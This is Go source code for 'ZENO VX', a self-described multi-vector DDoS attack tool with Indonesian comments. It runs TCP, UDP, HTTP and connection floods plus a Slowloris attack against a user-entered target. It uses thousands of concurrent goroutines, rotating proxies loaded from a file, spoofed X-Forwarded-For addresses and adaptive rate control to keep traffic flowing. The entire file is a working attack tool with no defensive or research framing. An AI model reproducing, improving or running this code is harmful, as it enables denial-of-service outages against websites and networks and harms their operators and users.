package main

import (
	"bufio"
	"crypto/rand"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Konfigurasi
const (
	DEFAULT_THREADS        = 1000
	TIMEOUT                = 5 * time.Second
	MAX_SLOWLORIS_SOCKETS  = 5000
	MAX_PACKETS_PER_WINDOW = 100000
	RATE_LIMIT_WINDOW      = 60 * time.Second
	PROXY_CHECK_TIMEOUT    = 3 * time.Second
	PROXY_REFRESH_INTERVAL = 60 * time.Second // Refresh proxy tiap 60 detik
)

// Proxy struct
type Proxy struct {
	URL       string
	Type      string // http, https, socks5
	Working   bool
	FailCount int
	LastUsed  time.Time
}

// ProxyManager struct
type ProxyManager struct {
	proxies       []*Proxy
	activeProxies []*Proxy
	mu            sync.RWMutex
	currentIndex  int
	lastRefresh   time.Time
}

// Helper function untuk repeat string
func repeatString(s string, count int) string {
	result := ""
	for i := 0; i < count; i++ {
		result += s
	}
	return result
}

// Adaptive Controller
type AdaptiveController struct {
	successRate float64
	delay       int64
	mu          sync.Mutex
}

func NewAdaptiveController() *AdaptiveController {
	return &AdaptiveController{
		successRate: 1.0,
		delay:       100000,
	}
}

func (ac *AdaptiveController) RecordPacket(success bool) {
	ac.mu.Lock()
	defer ac.mu.Unlock()
	
	if success {
		if ac.successRate < 0.99 {
			ac.successRate += 0.01
		}
		if ac.delay > 10000 {
			ac.delay = int64(float64(ac.delay) * 0.98)
		}
	} else {
		if ac.successRate > 0.5 {
			ac.successRate -= 0.05
		}
		if ac.delay < 10000000 {
			ac.delay = int64(float64(ac.delay) * 1.05)
		}
	}
}

func (ac *AdaptiveController) GetDelay() time.Duration {
	ac.mu.Lock()
	defer ac.mu.Unlock()
	return time.Duration(ac.delay) * time.Nanosecond
}

// ZenoVX Main Struct
type ZenoVX struct {
	target            string
	port              int
	threads           int
	running           int32
	packetsSent       int64
	totalPackets      int64
	startTime         time.Time
	adaptive          *AdaptiveController
	slowlorisSockets  []net.Conn
	slowlorisLock     sync.Mutex
	rateTimestamps    []time.Time
	rateLock          sync.Mutex
	proxyManager      *ProxyManager
	useProxy          bool
}

func NewZenoVX() *ZenoVX {
	return &ZenoVX{
		threads:       DEFAULT_THREADS,
		running:       1,
		adaptive:      NewAdaptiveController(),
		proxyManager:  &ProxyManager{
			proxies:       make([]*Proxy, 0),
			activeProxies: make([]*Proxy, 0),
		},
		useProxy:      false,
	}
}

// Load proxies dari file
func (pm *ProxyManager) LoadProxies(filename string) (int, error) {
	file, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	pm.mu.Lock()
	defer pm.mu.Unlock()

	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Parse proxy format: http://user:pass@ip:port atau ip:port
		proxyURL := line
		if !strings.Contains(line, "://") {
			proxyURL = "http://" + line
		}

		proxy := &Proxy{
			URL:       proxyURL,
			Working:   true,
			FailCount: 0,
		}

		// Deteksi tipe proxy
		if strings.HasPrefix(proxyURL, "https://") {
			proxy.Type = "https"
		} else if strings.HasPrefix(proxyURL, "socks5://") {
			proxy.Type = "socks5"
		} else {
			proxy.Type = "http"
		}

		pm.proxies = append(pm.proxies, proxy)
		count++
	}

	// Copy ke activeProxies
	pm.activeProxies = make([]*Proxy, len(pm.proxies))
	copy(pm.activeProxies, pm.proxies)

	return count, scanner.Err()
}

// Check proxy health
func (pm *ProxyManager) CheckProxy(proxy *Proxy) bool {
	client := &http.Client{
		Timeout: PROXY_CHECK_TIMEOUT,
		Transport: &http.Transport{
			Proxy: func(req *http.Request) (*url.URL, error) {
				return url.Parse(proxy.URL)
			},
		},
	}

	// Test request ke google atau target
	resp, err := client.Get("http://www.google.com")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	return resp.StatusCode == 200
}

// Refresh proxy list (hapus yang mati, test ulang)
func (pm *ProxyManager) RefreshProxies() {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	newActive := make([]*Proxy, 0)
	for _, proxy := range pm.proxies {
		if proxy.FailCount >= 3 {
			proxy.Working = false
			continue
		}
		
		// Test setiap 5 menit sekali aja biar gak berat
		if time.Since(proxy.LastUsed) > 5*time.Minute {
			if pm.CheckProxy(proxy) {
				proxy.Working = true
				proxy.FailCount = 0
				newActive = append(newActive, proxy)
			} else {
				proxy.FailCount++
				proxy.Working = false
			}
		} else if proxy.Working {
			newActive = append(newActive, proxy)
		}
	}

	pm.activeProxies = newActive
	pm.lastRefresh = time.Now()
}

// Get random proxy
func (pm *ProxyManager) GetRandomProxy() *Proxy {
	pm.mu.RLock()
	defer pm.mu.RUnlock()

	if len(pm.activeProxies) == 0 {
		return nil
	}

	// Refresh berkala
	if time.Since(pm.lastRefresh) > PROXY_REFRESH_INTERVAL {
		go pm.RefreshProxies()
	}

	randomIndex := randomInt(0, len(pm.activeProxies))
	proxy := pm.activeProxies[randomIndex]
	proxy.LastUsed = time.Now()
	return proxy
}

// Get HTTP client dengan proxy
func (z *ZenoVX) GetHTTPClientWithProxy() *http.Client {
	if !z.useProxy {
		return &http.Client{
			Timeout: TIMEOUT,
			Transport: &http.Transport{
				MaxIdleConnsPerHost: 100,
				DisableKeepAlives:   false,
			},
		}
	}

	proxy := z.proxyManager.GetRandomProxy()
	if proxy == nil {
		// Fallback ke direct connection
		return &http.Client{
			Timeout: TIMEOUT,
			Transport: &http.Transport{
				MaxIdleConnsPerHost: 100,
				DisableKeepAlives:   false,
			},
		}
	}

	proxyURL, _ := url.Parse(proxy.URL)
	return &http.Client{
		Timeout: TIMEOUT,
		Transport: &http.Transport{
			Proxy:               http.ProxyURL(proxyURL),
			MaxIdleConnsPerHost: 100,
			DisableKeepAlives:   false,
		},
	}
}

// Dial dengan proxy untuk TCP/UDP/SYN
func (z *ZenoVX) DialWithProxy() (net.Conn, error) {
	if !z.useProxy {
		return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", z.target, z.port), TIMEOUT)
	}

	proxy := z.proxyManager.GetRandomProxy()
	if proxy == nil {
		return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", z.target, z.port), TIMEOUT)
	}

	// Untuk koneksi TCP via HTTP proxy
	proxyURL, err := url.Parse(proxy.URL)
	if err != nil {
		return nil, err
	}

	// Connect ke proxy dulu
	conn, err := net.DialTimeout("tcp", proxyURL.Host, TIMEOUT)
	if err != nil {
		return nil, err
	}

	// Kirim CONNECT request
	connectReq := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", 
		z.target, z.port, z.target, z.port)
	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Baca response
	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}

	return conn, nil
}

func (z *ZenoVX) ClearScreen() {
	fmt.Print("\033[2J\033[H")
}

func (z *ZenoVX) Banner() {
	z.ClearScreen()
	fmt.Println("\033[95m" + repeatString("=", 70))
	fmt.Println("=\033[91m                   ZENO VX - GO EDITION                 \033[95m=")
	fmt.Println("=\033[92m              Multi-Vector DDoS Attack System           \033[95m=")
	fmt.Println("=\033[93m          Fully Automated - Adaptive Rate Control       \033[95m=")
	fmt.Println(repeatString("=", 70) + "\033[0m")
	fmt.Println("\033[91m[!] SYSTEM INITIALIZED. READY TO DEPLOY.\033[0m\n")
}

func (z *ZenoVX) SpoofIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		randomInt(1, 254),
		randomInt(1, 254),
		randomInt(1, 254),
		randomInt(1, 254))
}

func randomInt(min, max int) int {
	b := make([]byte, 4)
	rand.Read(b)
	return min + int(b[0])%int(max-min)
}

func (z *ZenoVX) GeneratePayload(attackType string) []byte {
	switch attackType {
	case "tcp":
		payload := make([]byte, randomInt(512, 2048))
		rand.Read(payload)
		return payload
	case "udp":
		payload := make([]byte, randomInt(1024, 65000))
		rand.Read(payload)
		return payload
	case "http":
		paths := []string{"/", "/index.html", "/api/v1", "/test", "/wp-admin", "/login"}
		spoofedIP := z.SpoofIP()
		userAgents := []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		}
		return []byte(fmt.Sprintf(
			"GET %s?%d=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nX-Forwarded-For: %s\r\nConnection: keep-alive\r\n\r\n",
			paths[randomInt(0, len(paths))],
			randomInt(1, 999999),
			randomInt(1, 999999),
			z.target,
			userAgents[randomInt(0, len(userAgents))],
			spoofedIP,
		))
	}
	return nil
}

func (z *ZenoVX) CheckRateLimit() bool {
	z.rateLock.Lock()
	defer z.rateLock.Unlock()

	now := time.Now()
	valid := make([]time.Time, 0)
	for _, ts := range z.rateTimestamps {
		if now.Sub(ts) < RATE_LIMIT_WINDOW {
			valid = append(valid, ts)
		}
	}
	z.rateTimestamps = valid

	if len(z.rateTimestamps) >= MAX_PACKETS_PER_WINDOW {
		return false
	}

	z.rateTimestamps = append(z.rateTimestamps, now)
	return true
}

func (z *ZenoVX) TCPFlood() {
	for atomic.LoadInt32(&z.running) == 1 {
		if !z.CheckRateLimit() {
			time.Sleep(time.Millisecond)
			continue
		}

		conn, err := z.DialWithProxy()
		if err == nil {
			payload := z.GeneratePayload("tcp")
			conn.Write(payload)
			conn.Close()

			atomic.AddInt64(&z.packetsSent, 1)
			atomic.AddInt64(&z.totalPackets, 1)
			z.adaptive.RecordPacket(true)

			if atomic.LoadInt64(&z.packetsSent)%500 == 0 {
				fmt.Printf("\033[92m[✓] TCP Packets: %d\033[0m\n", atomic.LoadInt64(&z.packetsSent))
			}
		} else {
			z.adaptive.RecordPacket(false)
		}

		time.Sleep(z.adaptive.GetDelay())
	}
}

func (z *ZenoVX) UDPFlood() {
	for atomic.LoadInt32(&z.running) == 1 {
		if !z.CheckRateLimit() {
			time.Sleep(time.Millisecond)
			continue
		}

		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(z.target), Port: z.port})
		if err == nil {
			payload := z.GeneratePayload("udp")
			burst := randomInt(5, 15)
			for i := 0; i < burst; i++ {
				conn.Write(payload)
			}
			conn.Close()

			atomic.AddInt64(&z.packetsSent, int64(burst))
			atomic.AddInt64(&z.totalPackets, int64(burst))
			z.adaptive.RecordPacket(true)

			if atomic.LoadInt64(&z.packetsSent)%1000 == 0 {
				fmt.Printf("\033[93m[✓] UDP Packets: %d\033[0m\n", atomic.LoadInt64(&z.packetsSent))
			}
		} else {
			z.adaptive.RecordPacket(false)
		}

		time.Sleep(z.adaptive.GetDelay() / 2)
	}
}

func (z *ZenoVX) HTTPFlood() {
	for atomic.LoadInt32(&z.running) == 1 {
		if !z.CheckRateLimit() {
			time.Sleep(time.Millisecond)
			continue
		}

		client := z.GetHTTPClientWithProxy()
		url := fmt.Sprintf("http://%s:%d/", z.target, z.port)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Forwarded-For", z.SpoofIP())

		requestsPerConn := randomInt(3, 8)
		for i := 0; i < requestsPerConn; i++ {
			if atomic.LoadInt32(&z.running) == 0 {
				break
			}
			client.Do(req)
		}

		atomic.AddInt64(&z.packetsSent, int64(requestsPerConn))
		atomic.AddInt64(&z.totalPackets, int64(requestsPerConn))
		z.adaptive.RecordPacket(true)

		if atomic.LoadInt64(&z.packetsSent)%1000 == 0 {
			fmt.Printf("\033[96m[✓] HTTP Requests: %d (Proxy: %v)\033[0m\n", 
				atomic.LoadInt64(&z.packetsSent), z.useProxy)
		}

		time.Sleep(z.adaptive.GetDelay() * 2)
	}
}

func (z *ZenoVX) SYNFlood() {
	for atomic.LoadInt32(&z.running) == 1 {
		if !z.CheckRateLimit() {
			time.Sleep(time.Millisecond)
			continue
		}

		rapidConnects := randomInt(20, 50)
		successCount := 0

		for i := 0; i < rapidConnects; i++ {
			if atomic.LoadInt32(&z.running) == 0 {
				break
			}
			conn, err := z.DialWithProxy()
			if err == nil {
				successCount++
				conn.Close()
			}
		}

		atomic.AddInt64(&z.packetsSent, int64(successCount))
		atomic.AddInt64(&z.totalPackets, int64(successCount))
		z.adaptive.RecordPacket(successCount > 0)

		if atomic.LoadInt64(&z.packetsSent)%10000 == 0 {
			fmt.Printf("\033[95m[✓] SYN Packets: %d\033[0m\n", atomic.LoadInt64(&z.packetsSent))
		}

		time.Sleep(100 * time.Microsecond)
	}
}

func (z *ZenoVX) SlowlorisAttack() {
	sockets := make([]net.Conn, 0)

	for atomic.LoadInt32(&z.running) == 1 {
		// Clean dead sockets
		newSockets := make([]net.Conn, 0)
		for _, s := range sockets {
			_, err := s.Write([]byte(fmt.Sprintf("X-a: %d\r\n", randomInt(1, 9999))))
			if err != nil {
				s.Close()
				continue
			}
			newSockets = append(newSockets, s)
		}
		sockets = newSockets

		// Add new sockets
		if len(sockets) < MAX_SLOWLORIS_SOCKETS {
			toAdd := 100
			if MAX_SLOWLORIS_SOCKETS-len(sockets) < toAdd {
				toAdd = MAX_SLOWLORIS_SOCKETS - len(sockets)
			}

			for i := 0; i < toAdd; i++ {
				if atomic.LoadInt32(&z.running) == 0 {
					break
				}
				conn, err := z.DialWithProxy()
				if err == nil {
					conn.Write([]byte(fmt.Sprintf("GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", 
						randomInt(1, 9999), z.target)))
					sockets = append(sockets, conn)
					atomic.AddInt64(&z.packetsSent, 1)
					atomic.AddInt64(&z.totalPackets, 1)
				}
			}
		}

		if len(sockets) > 0 {
			fmt.Printf("\033[94m[✓] Slowloris Connections: %d\033[0m\n", len(sockets))
		}

		time.Sleep(15 * time.Second)
	}
}

func (z *ZenoVX) StatsMonitor() {
	lastTotal := int64(0)
	lastTime := time.Now()

	for atomic.LoadInt32(&z.running) == 1 {
		time.Sleep(5 * time.Second)

		if atomic.LoadInt32(&z.running) == 0 {
			break
		}

		currentTime := time.Now()
		elapsed := currentTime.Sub(z.startTime)
		currentTotal := atomic.LoadInt64(&z.totalPackets)

		rate := float64(currentTotal-lastTotal) / currentTime.Sub(lastTime).Seconds()
		avgRate := float64(currentTotal) / elapsed.Seconds()

		proxyCount := 0
		if z.proxyManager != nil {
			z.proxyManager.mu.RLock()
			proxyCount = len(z.proxyManager.activeProxies)
			z.proxyManager.mu.RUnlock()
		}

		fmt.Println("\033[90m" + repeatString("─", 70))
		fmt.Printf("[📊] STATISTICS - %s\n", currentTime.Format("15:04:05"))
		fmt.Printf("[📊] Total Packets: %d\n", currentTotal)
		fmt.Printf("[📊] Current Rate: %.0f pps | Average: %.0f pps\n", rate, avgRate)
		fmt.Printf("[📊] Adaptive Delay: %.6fs\n", z.adaptive.GetDelay().Seconds())
		fmt.Printf("[📊] Active Proxies: %d | Proxy Mode: %v\n", proxyCount, z.useProxy)
		fmt.Println("\033[90m" + repeatString("─", 70) + "\033[0m")

		lastTotal = currentTotal
		lastTime = currentTime
	}
}

func (z *ZenoVX) StartAttack() {
	z.Banner()

	// Get target info
	fmt.Print("\033[94m[>] Target IP/Domain: \033[0m")
	fmt.Scanln(&z.target)
	fmt.Print("\033[94m[>] Target Port [default:80]: \033[0m")
	fmt.Scanln(&z.port)
	if z.port == 0 {
		z.port = 80
	}
	
	// Proxy option
	var useProxy string
	fmt.Print("\033[94m[>] Use Proxy? (y/n) [default:n]: \033[0m")
	fmt.Scanln(&useProxy)
	
	if useProxy == "y" || useProxy == "Y" {
		z.useProxy = true
		
		// Load proxies
		count, err := z.proxyManager.LoadProxies("proxy.txt")
		if err != nil {
			fmt.Printf("\033[91m[!] Error loading proxy.txt: %v\033[0m\n", err)
			fmt.Println("\033[93m[!] Continuing without proxies...\033[0m")
			z.useProxy = false
		} else {
			fmt.Printf("\033[92m[+] Loaded %d proxies from proxy.txt\033[0m\n", count)
			// Test proxies in background
			go z.proxyManager.RefreshProxies()
		}
	}
	
	fmt.Print("\033[94m[>] Threads [default:1000]: \033[0m")
	fmt.Scanln(&z.threads)
	if z.threads == 0 {
		z.threads = DEFAULT_THREADS
	}

	// Resolve target
	ips, err := net.LookupIP(z.target)
	if err == nil && len(ips) > 0 {
		z.target = ips[0].String()
	}

	z.ClearScreen()
	fmt.Println("\033[91m" + repeatString("=", 70))
	fmt.Println("🔥 ZENO-VX GO EXTREME ATTACK INITIATED 🔥")
	fmt.Println(repeatString("=", 70) + "\033[0m\n")
	fmt.Printf("\033[93m[!] Target: %s:%d\n", z.target, z.port)
	fmt.Printf("[!] Threads: %d\n", z.threads)
	fmt.Printf("[!] Attack Vectors: TCP, UDP, HTTP, SYN, Slowloris\n")
	fmt.Printf("[!] Adaptive Rate Control: ENABLED\n")
	if z.useProxy {
		fmt.Printf("[!] Proxy Mode: ENABLED (proxy.txt)\n")
	} else {
		fmt.Printf("[!] Proxy Mode: DISABLED (direct connection)\n")
	}
	fmt.Printf("\n\033[0m")

	z.startTime = time.Now()

	// Start attack vectors
	go z.TCPFlood()
	go z.UDPFlood()
	go z.HTTPFlood()
	go z.SYNFlood()
	go z.SlowlorisAttack()
	go z.StatsMonitor()

	// Start additional threads
	for i := 0; i < z.threads; i++ {
		attackType := randomInt(0, 4)
		switch attackType {
		case 0:
			go z.TCPFlood()
		case 1:
			go z.UDPFlood()
		case 2:
			go z.HTTPFlood()
		case 3:
			go z.SYNFlood()
		}
	}

	fmt.Printf("\033[92m[+] Starting %d attack goroutines...\033[0m\n\n", z.threads+5)

	// Wait for interrupt
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	atomic.StoreInt32(&z.running, 0)
	elapsed := time.Since(z.startTime)
	fmt.Printf("\n\033[91m"+repeatString("=", 70))
	fmt.Printf("\n[!] ZENO-VX TERMINATED\n")
	fmt.Printf("[!] Total Packets Sent: %d\n", atomic.LoadInt64(&z.totalPackets))
	fmt.Printf("[!] Duration: %.1f seconds\n", elapsed.Seconds())
	fmt.Printf("[!] Average Rate: %.0f packets/sec\n", float64(atomic.LoadInt64(&z.totalPackets))/elapsed.Seconds())
	fmt.Println(repeatString("=", 70) + "\033[0m")
}

func main() {
	// Parse command line arguments
	targetFlag := flag.String("target", "", "Target IP/Domain")
	portFlag := flag.Int("port", 0, "Target port")
	threadsFlag := flag.Int("threads", 0, "Number of threads")
	proxyFlag := flag.Bool("proxy", false, "Use proxy from proxy.txt")
	flag.Parse()

	z := NewZenoVX()
	z.useProxy = *proxyFlag

	if *targetFlag != "" && *portFlag != 0 {
		z.target = *targetFlag
		z.port = *portFlag
		if *threadsFlag > 0 {
			z.threads = *threadsFlag
		}
		
		if z.useProxy {
			count, err := z.proxyManager.LoadProxies("proxy.txt")
			if err == nil {
				fmt.Printf("\033[92m[+] Loaded %d proxies from proxy.txt\033[0m\n", count)
				go z.proxyManager.RefreshProxies()
			} else {
				fmt.Printf("\033[91m[!] Error loading proxy.txt: %v\033[0m\n", err)
				z.useProxy = false
			}
		}
		
		z.Banner()
		fmt.Printf("\033[92m[+] Target: %s:%d\033[0m\n", z.target, z.port)
		fmt.Printf("\033[93m[+] Launching attack with %d threads...\033[0m\n", z.threads)
		if z.useProxy {
			fmt.Printf("\033[94m[+] Proxy Mode: ENABLED\033[0m\n\n")
		} else {
			fmt.Printf("\033[93m[+] Proxy Mode: DISABLED\033[0m\n\n")
		}
		z.startTime = time.Now()
		go z.StartAttack()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

		atomic.StoreInt32(&z.running, 0)
	} else {
		z.StartAttack()
	}
}
